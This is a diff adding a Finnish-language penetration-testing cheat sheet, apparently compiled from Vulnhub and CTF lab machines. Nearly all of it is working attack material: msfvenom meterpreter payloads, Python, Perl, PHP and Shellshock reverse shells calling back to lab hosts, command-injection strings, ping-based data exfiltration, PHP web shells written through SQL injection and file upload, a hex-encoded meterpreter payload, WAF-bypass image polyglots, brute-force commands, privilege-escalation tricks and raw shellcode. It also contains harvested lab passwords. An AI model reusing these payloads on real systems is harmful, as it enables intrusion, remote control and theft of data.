@@ -1,0 +1,537 @@
+privilege escalation linux
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+crypto solver, kokeilla jos ei vaiks rot13 löydä:
+https://quipqiup.com/
+
+täältä löytyy scripti millä saa ajettua gdb ja normaali samoilla env arvoilla(toimii sama exploit gdb:ssä ja ulkona siitä)
+https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966
+
+interesting stuff:
+https://download.vulnhub.com/media/stapler/slides.pdf
+
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+Enumeration stuff:
+http://0daysecurity.com/penetration-testing/enumeration.html
+
+sqlmap voi käyttää myös burpista saatavalla request-tiedostolla suoraan.
+burpsuitessa avaa requestin repeater-tab, oikeilla parametreilla ja right-click, copy to file ja sitten
+sqlmap -r login.req -p pass --dbms mysql --level 4 --risk 3 --dump
+
+pass parametri löytyi browserilla, ensin koittaa laitaa kaikenlaisia erikoismerkkejä:
+'"!@#$'% jos tulee virhe koittaa yksitellen mikä aiheittaa virheen, tässä se oli '
+jos tämä on mysql db, tämän pitäisi mennä oikein läpi
+pass=admin'-- '
+ja tällä pääsi sisään
+pass=' OR '1'='1
+
+sqlmap -u "http://192.168.182.131/login.php" --cookie="PHPSESSID=4elm3a4dcdg0lac4oc41l76l96" --method=POST --data="username=nimi&password=sala"
+
+
+HTTP command injection, tämä python script joka toimii melkein ko shell, cmd injection kautta
+(<?php $r=base64_decode($_POST['cmd']).' '.base64_decode($_POST['opts']); echo `$r` ?>)
+https://github.com/praetorian-inc/pyshell
+
+
+Introduction to sw exploits:
+http://opensecuritytraining.info/Exploits1.html
+
+
+PHP reverse meterpreter shell: (ja tähän lisää <?php ja ?> ) targettiin maililla / file include / ... ja selaimella lukemaan
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.182.130 -e php/base64 -t raw > jari.php
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.182.130 LPORT=443 -e php/base64 -t raw > rev_meter.php
+
+linux reverse meterpreter:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.83.128 LPORT=4444 -f elf > shell.elf
+
+python variable shell koodille:
+msfvenom -p linux/x86/shell_reverse_tcp -b '\x00\x0A' -f python --var-name linuxrevshell EXITFUNC=thread LHOST=10.10.14.99 LPORT=4444
+
+
+Git stuff:
+https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/
+
+http://hydra.geht.net/tino/howto/vmware/vmwareplayer/
+
+NoRedirect plugin firefox
+
+SQLInjection stuff:
+http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+http://serverfault.com/questions/548320/override-path-to-binary-for-particular-user/548323#548323
+Täällä vielä funtion käytöstä, oikean binäärin sijaan:
+https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/
+
+
+debugging binaries ja python scriptin rakennusta:
+http://ctfhacker.com/boot2root/pwnable/2015/09/21/vulnhub-brainpan3.html
+
+binary jutskia:
+https://www.vulnhub.com/entry/pegasus-1,109/
+
+keinoja kiertää binary estoja:
+https://leonjza.github.io/blog/2014/09/18/from-persistence/
+
+etsiä binääristä hyppypiste: eli tuo 0x08048e93 ylikirjoitetaan eip:hen (https://www.doyler.net/security-not-included/knock-knock-1-1-walkthrough)
+koska esp osoittaa osoitteeseen heti eip:n jälkeen, jolloin shellcode voi olla suoraan eip:n ylikirjoituksen perässä
+msfelfscan -j esp tfc
+[tfc]
+0x08048e93 jmp esp
+0x08048e93 jmp esp
+
+Täältä win ja linux bufferoverflow jmp esp ja call *%esp
+http://resources.infosecinstitute.com/brainpan_virtual_machine/
+
+x86 shellcode:
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+täällä lopussa etsii core dumpista exploitin (se missä tarvittiin encrypted exploit ajaa takas)
+https://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/
+
+ROP stuff:
+https://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/
+
+Bufferin ylikirjoitusta, tämä ottaa yhteyden pwnable.kr ja dumppaa tuon. ILMAN tuota CAT ei vaan toimi, en tiiä miks :( jotain tekemistä tuon kyseisen testin kanssa, se antaa system shellin, jo jostain syystä tarttee
+(python -c "print 52*'A'+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+
+kYO9YXnr+/6+Uh3jy+D+NMieYu7y/hQlmkHekgXNmYsU9eNlDheuTX9qgHzL2LJ4Bmi/sZc2GyM6kCC61YvgoA==
+
+To disable ASLR:
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+tai
+ulimit -s unlimited
+varmistaa että ob ASLR pois käytöstä: /pegasus on ajettva tiedosto, ajaa monta kertaa ja varmistaa osoitteiden säilyvyys
+ldd pegasus
+
+binäärin siirto:
+xxd -p /usr/local/bin/wopr
+ja omalla koneella:
+cat wopr.hex | xxd -r -p > wopr
+
+pattern create:
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 500
+
+etsi oikea offset:
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 33624132
+
+
+
+
+http://pentestmonkey.net/blog/post-exploitation-without-a-tty
+
+
+
+ShellShock: ( -X käytä proxyä)
+curl -x http://192.168.0.113:3128 -A "() { :; };/bin/sh -i >& /dev/tcp/192.168.0.106/443 0>&1" http://192.168.0.113/cgi-bin/status
+
+Test for shellshock:
+curl 192.168.182.141:591/cgi-bin/cat -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+
+Reverseshell -> 192.168.182.130:1234
+curl 192.168.182.141:591/cgi-bin/cat -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/sh -i >& /dev/tcp/192.168.182.130/51242 0>&1 "
+
+
+
+
+
+netdiscover
+
+dirb
+Isompi sanalista ja vielä .php perään:
+dirb https://192.168.83.136 /usr/share/wordlists/dirb/big.txt -X .php
+
+dirbusterin isompaa sanalistaa kannattaa myös kokeilla, siinä on eri sanoja kuin tuossa
+dirb http://10.10.10.34 /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
+
+dirb:llä kun tuntuu kestävän:
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.10.34/FUZZ
+
+
+
+dirbuster 
+
+wfuzz -c -z file,/usr/share/dirb/wordlists/big.txt --hc 404 http://192.168.182.136:33447/Challenge/FUZZ.php
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/j.py
+python /tmp/j.py
+
+
+perl -e 'exec "/bin/bash";'
+
+REVERSE SHELL muista aina tarkistaa oletetut portit!!!! 443, 8080, jne
+/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.182.130",51242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.182.130",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+php -r '$sock=fsockopen("192.168.83.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+kun php:ssä eivät toimi system(), exec(), shell_exec() . tällä hakemistolistaus
+<?php $dir = '.'; $data=scandir($dir);print_r($data); ?>
+
+
+
+crack md5 pw's:
+https://crackstation.net/
+
+
+
+find world writeable files:
+find / -perm -0002 -type f 2>/dev/null | grep -v "proc"
+
+find käyttäjän acid tiedostot ja ohjaa virheet dev/nulliin
+find / -user acid 2>/dev/null
+
+find SUID tiedostot:
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+while read in; do file $in; done <file >tiedot
+
+
+<script>alert("XSS toimii");</script>
+
+
+### voi olla ettei ping ole sallittu, koita vaiks telnet 192.168.83.129 1234 
+test;ping -c 4 192.168.0.106; echo hello
+
+test; /usr/local/bin/nc 192.168.0.106 4321 -e /bin/bash; echo hello
+
+test; /bin/bash -i > /dev/tcp/192.168.0.106/4321 0<&1 2>&1; echo
+;/bin/sh -i >& /dev/tcp/192.168.83.129/1234 0>&1
+
+Voi kanssa yrittää luoda uuden .php tiedoston: (jonne sitten http://192.168.83.137:8080/phptax/shell.php?cmd=ls%20-la )
+xxx;echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+
+jostain syystä wget ei saanut kirjoitettua tiedostoa, mutta curl sai:
+<?php system("curl -o ./uploads/revshell_curl.php http://10.10.14.180:8000/revshell.php"); ?>
+
+
+hydra 192.168.0.115 http-form-post "/?q=node&destination=node:user=^USER^&pass=^PASS^&form_build_id=form-7u8ZlNGw-I7YFD73ZXPJSqlLC7z_dU9MQcNm1ydPf4Y&form_id=user_login_block&op=Log+in:sorry" -l admin -P /mnt/hgfs/temp/rockyou.txt
+
+hydra 192.168.0.112 http-form-post "/index.php:action=dologin&username=^USER^&password=^PASS^:invalid" -l admin -P /mnt/hgfs/temp/rockyou.txt
+
+
+tää toimi yksinkertaseen formiin:
+hydra 192.168.182.133 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid" -P /mnt/hgfs/temp/rockyou.txt -l root
+'elite'
+
+http basic authentication:
+hydra -l pipe -P /mnt/hgfs/temp/rockyou.txt 192.168.182.138 http-head /index.php
+
+hydra ssh password:
+hydra -L usernames.txt -e nsr 192.168.83.130 ssh
+
+hydraan voi myös laitaa optiot: -e ns -vV
+tällä näkee miten etenee
+
+seuraavat täältä: https://research.g0blin.co.uk/primer-vulnhub-writeup/
+SQL injection: (ek TÄMÄ)
+
+basic sql injection:
+‘=’ molempiin username: '='  ja password: '='
+
+sqlmap muistaa lisätä nämä ellei muuten ala löytymään: --level=5 --risk=3
+
+sqlmap voi koittaa laittaa loppuun: --os-shell
+jos sattuu olemaan MS SQL koittaa käynnistää shellin xp_cmdshell - komennolla
+
+sqlmap --threads=10 --random-agent --url="http://192.168.182.129/login.php" --data="usr=usr*&pw=pw&commit=Login"
+
+Tämä selvitti database nimen (== -Dtest, seuraavaan kyselyyn)
+sqlmap --threads=10 --random-agent --url="http://192.168.182.129/login.php" --data="usr=usr*&pw=pw&commit=Login" --current-db
+
+Ja tämä näytti taulun sisällön ( arvaus -Tusers)
+sqlmap --threads=10 --random-agent --url="http://192.168.182.129/login.php" --data="usr=usr*&pw=pw&commit=Login" -Dtest -Tusers --dump
+
+sqli joka toimi:
+' or 1=1#
+
+tämä NullByte, pelkkä get request ja yksi parametri
+sqlmap -u http://192.168.56.104/kzMb5nVYJw/420search.php?usrtosearch=a
+
+DB nimi
+sqlmap -u http://192.168.182.133/kzMb5nVYJw/420search.php?usrtosearch=a --current-db     tänne ko laittais --dbs saisi kaikki taulut
+current database:    'seth'
+
+Kertoo db sisällön:
+sqlmap -u http://192.168.182.133/kzMb5nVYJw/420search.php?usrtosearch=a -Dseth --dump
+
+
+taulut tietokannasta -----------==========================-------------  -Dseth --tables
+
+taulun sisältämä tieto ---------------===================------------    -Dseth -T flag --dump
+
+Tässä kun tarvi session cookien että saa queryt tehtyä:
+sqlmap -u "http://192.168.182.137:33447/Challenge/hacked.php?add=Add+ID" --cookie="sec_session_id=jjd47d9a0ncnqml4tk4qdiba52" -p id --method=POST --data="id=1"
+ switch -a perään vaan ihan pakosta == hakee kaikki
+
+
+
+Tamper scripts to try to detect sqli possibilities:
+sqlmap -u "http://192.168.182.134:33447/bin/l33t_haxor.php?id=1*%22" --dbms=mysql --threads=10 -p id --batch --tamper=space2comment,space2dash,space2hash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank
+root pw from mysql:
+mehak
+
+brute force SSH (ja monta muuta)  (täältä http://blackndoor.com/acid-reloaded/)
+patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg='Authentication failed.'
+
+
+Näitä tarvitaan, jos on webbi sivu jolta saa haettua tiedostoja serverriltä.
+Tuo php://filter - on siksi ettei webbi sivu aja noita php komentoja vaan palauttaa base64 enkoodatun rivin:
+http://192.168.182.137:33447/Challenge/include.php?file=php://filter/convert.base64-encode/resource=cake.php&add=Extract+File
+
+http://192.168.182.137:33447/Challenge/include.php?file=php://filter/convert.base64-encode/resource=Magic_Box/tails.php&add=Extract+File
+
+http://192.168.182.137:33447/Challenge/include.php?file=php://filter/convert.base64-encode/resource=Magic_Box/proc/validate.php&add=Extract+File
+
+Tällä pääsee kanssa katsomaan, kunhan oikeudet on kunnossa: nyt sec_session_id cookie
+curl -s --cookie "sec_session_id=sss9ukhur1csmnt5at966et5k3" http://192.168.182.137:33447/Challenge/include.php?file=$(php -r "echo urlencode('php://filter/convert.base64-encode/resource=hacked.php');") | sed  '/<html>/,/*/d' | cut -d '<' -f 1 | base64 --decode
+curl -s --cookie "sec_session_id=jjd47d9a0ncnqml4tk4qdiba52" "http://192.168.182.137:33447/Challenge/include.php?file=/tmp/shell.php&cmd=$(php -r "echo urlencode('id ;uname -a;pwd;which nc;which wget;which perl;which python');")" | sed  '/<!DOCTYPE html>/,/*/d'
+
+Täältä miten saa kirjoiteetua tiedostoja php:lla kun 
+https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf
+<?php file_put_contents('msf.php',file_get_contents('http://192.16.83.129/evil.txt'));?>
+
+
+Command injection: ajaa perl scriptin joka törkkää /bin/sh:n 192.168.182.130:1234
+perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.182.130%22%3B%24p%3D1234%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
+
+Tällä upload reverse shell: (jos omalla koneella kuuntelemassa: nc -nvlp 7777 < revshell.pl)
+curl -s --cookie "sec_session_id=64uk8pthsvr3939mm9joa5u254" "http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&cmd=$(php -r "echo urlencode('cd /tmp;nc 192.168.2.108 7777 > revshell.pl');")" | sed  '/<!DOCTYPE html>/,/*/d'
+
+ja tällä käyttöön:
+curl -s --cookie "sec_session_id=64uk8pthsvr3939mm9joa5u254" "http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&cmd=$(php -r "echo urlencode('cd /tmp;perl revshell.pl');")" | sed  '/<!DOCTYPE html>/,/*/d'
+
+
+Command injection, kun vain ping toimii, ajaa id:n ja kertoo tuloksen pinging -c kentässä:
+;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.182.130; done
+
+;ls | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.182.130; done
+
+
+
+sqlmap --threads=10 --random-agent --url="http://192.168.182.138/index.php" --data="param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D"
+
+
+
+O:3:"Log":2:{s:8:"filename";s:28:"/var/www/html/scritpz/me.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}
+
+
+O:3:"Log":2:{s:8:"filename";s:29:"/var/www/html/scriptz/me1.php";s:4:”data";s:45:"<pre><?php system($_GET['cmd']);exit;?></pre>";}
+http://192.168.182.138/scriptz/me5.php?cmd=nc%20192.168.182.130%201234%20-e%20/bin/sh
+
+suora PHP nc komento:
+O:3:"Log":2:{s:8:"filename";s:19:"/var/www/html/a.php";s:4:"data";s:53:"<?php passthru("nc -e /bin/sh 192.168.182.130 8089")?>";}
+
+
+jdwp jave debugger:
+https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/
+
+jdp -attach 192.168.182.139:9001
+
+threads
+interrupt 0x1
+tämä monta kertaa, että näkee käyttäjän: (-n 1 & -n 2 & -n 3 ...)
+print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("tail -n 1 /etc/tomcat/tomcat-users.xml").getInputStream())).readLine())
+
+<user username="sl33py" password="Gu3SSmYStR0NgPa$sw0rD!
+
+deploy war through tomcat:
+https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/
+
+
+laita ssh avain paikalleen:
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCXBbB1pkGF/AMfUGOWWUEdFaB80dqB5p6LJzEfSjdYMhyDNOgxsCuYryD1t+G+a6g/prLOyLWoOZgobnSqz2IYaH5ap8Vo5tLeietZizZWnTuXAq3IzOapwl0M3COmnBLB8HL+QtjqDRKAtxM4KHGcrHNZOdoTY0wfb2CVJJd1pZlaKZlFqGVEMJeuGWs5jUs9uLKHGm3fd1AoxeeDu7YfObTESHeI2Jlc8t/ibzsaRhWac/Qq9VM+0nkPU1/vYrCWB2tB2+o5DepkXOm2IXFrFg31oJREVD11FFODHXqVPfhfed39BcTaQjrWar9XEA/3qcBhVO/7xsC3c103vaYn" >> authorized_keys
+chmod 600 authorized_keys
+
+ja login tällä: (käyttäjäksi se kenelle authorized_keys laitettiin)
+ssh -i id_rsa delacroix@192.168.182.133
+
+jos löytyy PUT option mahdollista upload joku tiedosto, metasploit auxiliary/scanner/http/http_put
+curl http://192.168.182.135/test/ -v -X OPTIONS
+
+tai vaiks nmap:
+nmap -p 80 --script http-put --script-args http-put.url='/test/ofs.c',http-put.file='/root/vulnhub/Sick0s1.2/ofs.c' 192.168.182.135
+
+curl:lla:
+curl -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.182.135/test/exec.php
+
+ja tässä curl komento joka ajaa python reverse shellin 192.168.182.130 443 porttiin
+curl "http://192.168.182.135/test/exec.php?cmd=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.182.130%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
+
+
+Lisää itsensä sudoer's listalle:
+echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers
+ja sitten vain: sudo su
+
+cronjob joka pyörii rootin oikeuksilla: (vaihtaa rootin salasanan -> 12345678
+echo "root:12345678" | chpasswd    
+
+simple shell spawn: (chown root:root & chmod 4777)   
+int main() {
+    setuid(0);
+    system("/bin/sh");
+    return 0;
+}
+
+toinen shell spawn:  saattaa onnistua jos käyttää tuota -p optiota
+cp /bin/bash /tmp/jari
+chown root:root /tmp/jari
+chmod 4777 /tmp/jari
+/tmp/jari -p
+
+find out wordpress vulnerabilities:
+wpscan --url https://192.168.83.130:12380/blogblog --enumerate p      ####p == plugins & vp == vulnerable plugins   ap == all plugins takes a while
+wpscan --url https://192.168.83.130:12380/blogblog --enumerate u      #### käyttäjänimet
+
+jos käyttää WordPress Plugin Advanced Video 1.0 - Local File Inclusion (https://www.exploit-db.com/exploits/39646/) 
+Haetut tiedostot tulee tänne:
+https://192.168.83.135:12380/blogblog/wp-content/uploads/
+
+
+kun on admintunnus/salasana hallussa metasploitilla voi ajaa exploitilla meterpreterin:
+use exploit/unix/webapp/wp_admin_shell_upload
+
+
+wordpress password brute force:
+wpscan --url http://192.168.83.131 --wordlist /root/vulnhub/mrRobot/fsocity.dic --username elliot
+
+sort fsocity.dic | uniq > test.txt
+hydra -v -t 3 -l elliot -P ./test.txt 192.168.83.131 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
+
+wordpress plugin needs this in front to be a plugin:
+<?php
+/*
+Plugin Name: pwnage
+Plugin URI: www.google.com
+Description: To pwn you
+Author: meep
+Version: 1.0
+Author URI: www.google.com
+*/
+
+mysql:
+mysql -uroot -pplbkac -h 192.168.83.130
+
+Jos on rootin oikeudet mysql prosessilla, voi lisätä itsensä admin ryhmään: (en kyl tiiä mitä iloa tästä on, ei saanut lisätty root ryhmään, tässä tapauksessa onnistui koska admin ryhmällä oli sudo oikat kaikkeen)
+Tämä kirjasto pitää olla paikalla, jos ei ole pitää ladata se:
+$whereis lib_mysqludf_sys.so
+lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
+mysql> select sys_exec('usermod -a -G admin john');
+tai luo scriptin joka lisaa itsensa sudoers listalle ja ajaa sen mysql:n kautta:
+$ cat jari.sh
+echo "john	ALL=(ALL) ALL" >> /etc/sudoers
+mysql> select sys_exec('/home/john/jari.sh'); 
+
+echo -n "<?php phpinfo(); ?>" | xxd -ps
+3c3f70687020706870696e666f28293b203f3e
+select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/https/blogblog/wp-content/uploads/test.php";
+
+Tämäkin ainakin joskus toimii:
+select "<?php passthru($_GET['cmd']); ?>" into outfile '/var/www/https/blogblog/wp-content/uploads/sh.php';
+curl -k -s https://192.168.83.135:12380/blogblog/wp-content/uploads/sh.php?cmd=uname+-a
+
+tämä kirjoitti sql injectionissa: (juuri tämä tapaus tartti nuo , 2, 3 mutta sivun antama virheilmoitus oli sama, vaikka kirjoittikin tuon tiedoston)
+' union select 0x3c3f70687020706870696e666f28293b203f3e, 2, 3 into outfile "/var/www/jari2.php"#
+PAITSI TÄSSÄ KANNATTAA LAITTAA , 2, 3 tilalle , '//', '//' <- toimivat php kommentteina.
+
+
+msfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST=192.168.83.129 LPORT=443 -o webshell.php
+TÄSTÄ pitää tarkistaa alkumerkki <?php JA MYÖS loppu merkki ?>  ##alussa yleensä kommentti ja loppumerkki puuttuu kokonaan, joskus toimii ilman mutta ei aina
+
+cat webshell.php | xxd -ps | tr -d '\n'        ### MUISTA TARKISTAA webshell.php ja poistaa kommentti php:n edeltä!!!!!!!!!!!!!!!!!!!!!!!!!!!
+ja tämä samallalailla selectillä sisään ja surffaamaan
+' union select 0x3c3f70687020206572726f725f7265706f7274696e672830293b20246970203d20273139322e3136382e38332e313239273b2024706f7274203d203434333b2069662028282466203d202773747265616d5f736f636b65745f636c69656e7427292026262069735f63616c6c61626c652824662929207b202473203d20246628227463703a2f2f7b2469707d3a7b24706f72747d22293b2024735f74797065203d202773747265616d273b207d20656c736569662028282466203d202766736f636b6f70656e27292026262069735f63616c6c61626c652824662929207b202473203d202466282469702c2024706f7274293b2024735f74797065203d202773747265616d273b207d20656c736569662028282466203d2027736f636b65745f63726561746527292026262069735f63616c6c61626c652824662929207b202473203d2024662841465f494e45542c20534f434b5f53545245414d2c20534f4c5f544350293b2024726573203d2040736f636b65745f636f6e6e6563742824732c202469702c2024706f7274293b2069662028212472657329207b2064696528293b207d2024735f74797065203d2027736f636b6574273b207d20656c7365207b2064696528276e6f20736f636b65742066756e637327293b207d206966202821247329207b2064696528276e6f20736f636b657427293b207d20737769746368202824735f7479706529207b2063617365202773747265616d273a20246c656e203d2066726561642824732c2034293b20627265616b3b20636173652027736f636b6574273a20246c656e203d20736f636b65745f726561642824732c2034293b20627265616b3b207d206966202821246c656e29207b2064696528293b207d202461203d20756e7061636b28224e6c656e222c20246c656e293b20246c656e203d2024615b276c656e275d3b202462203d2027273b207768696c6520287374726c656e28246229203c20246c656e29207b20737769746368202824735f7479706529207b2063617365202773747265616d273a202462202e3d2066726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b20636173652027736f636b6574273a202462202e3d20736f636b65745f726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b207d207d2024474c4f42414c535b276d7367736f636b275d203d2024733b2024474c4f42414c535b276d7367736f636b5f74797065275d203d2024735f747970653b206576616c282462293b2064696528293b0a , '//', '//' into outfile "/var/www/jari7.php"#
+
+https://192.168.83.130:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
+
+SMB info linuxills:
+enum4linux 192.168.83.130
+
+joskus saa rootin oikeudet: nmap version 3.81 (4.11 kin näyttäis toimivan) (-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap)
+nmap --interactive
+!sh
+id
+
+WAF web application firewall bybass:
+laita tyypiksi GIF ja tiedoston alkuun GIF
+Content-Type: image/gif
+
+
+
+GIF <?php ...
+
+Jotta GIF:n sisällä oleva php ajetaan pitää olla .php tiedostossa tai sitten kuva pitää ladata sivulle sielä olevalla include(require jne...) tagilla: 
+$ cat evil.gif
+GIF89a1
+
+<?php system($_POST["cmd"]); ?>
+
+we can trigger the payload in the uploaded *.gif by using the "lang" cookie flag in the index.php:
+
+    if (isset($_COOKIE['lang']))
+    {
+        include("lang/".$_COOKIE['lang']);
+    }
+
+$ curl -s --data "cmd=id" http://192.168.83.136ng=../upload/91fac8bab090c811894178f59cd43412.gif" | head -3
+
+kadimus lfi scan and exploit tool. local file inclusion
+
+LFI kamaa
+https://highon.coffee/blog/lfi-cheat-sheet/
+
+PHP encode jolla saa luettua vauiks .php tiedostoja kun tulee bas64 encoodattuna ei serveri aja koodia valmiiksi
+GET /?page=php://filter/convert.base64-encode/resource=upload
+
+Tällä saa laitettua jpg kuvaan php koodia:
+exiftool -documentname='<?php system($_POST["cmd"]); _halt_compiler();?>' jari.jpg 
+
+Tuola ylempänä on serveri koodi joka lisää includena lang-cookien sisällön(jpg:iin tuli random nimi)
+curl -s http://192.168.83.136 -b "lang=../upload/f6e27d20b3e9e592fe2e1b85f0904d0b.jpg" --data "cmd=pwd"
+
+
+weevely PHP shell, etsiä netistä toimii joidenkin WAF:ien ohi:
+weevely generate mahsecret /root/vulnhub/imf/door.php
+weevely http://192.168.83.133/imfadministrator/uploads/14037f9128fa.gif mahsecret ls
+
+saa ohitettua jotain WAF: ?cmd=id   ###vaiks
+<?php $c=$_GET['c']; echo `$c`; ?>
+
+command injection, joka tutkii onko ; ja && merkkejä: (command menee post parametrissä, seuraavalle riville vain haluttu komento, jo toimii)
+host=127.0.0.1
+
+ping+-c+2+192.168.83.128
+
+
+Restricted shell juttuja:
+jos saa vi (vim) päälle saa shellin:
+:set shell=/bin/bash
+:!bash
+
+jos on echo käytössä:
+echo os.system('/bin/bash')
+
+
+
+netcat without -e option
+mknod backpipe p
+/bin/bash 0<backpipe | nc -l -p 8080 1>backpipe
+
+dirtycow local priv exploit: (cowroot.c) kernel version is : 4.8.0, vaiks tuola puhutaan 3.9 jotain
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://www.exploit-db.com/exploits/40616/
+
+luo wordlist:
+cewl -w customwordlist.txt -d 5 -c 7 https://fr.wikipedia.org/wiki/%2850000%29_Quaoar
+
+
+
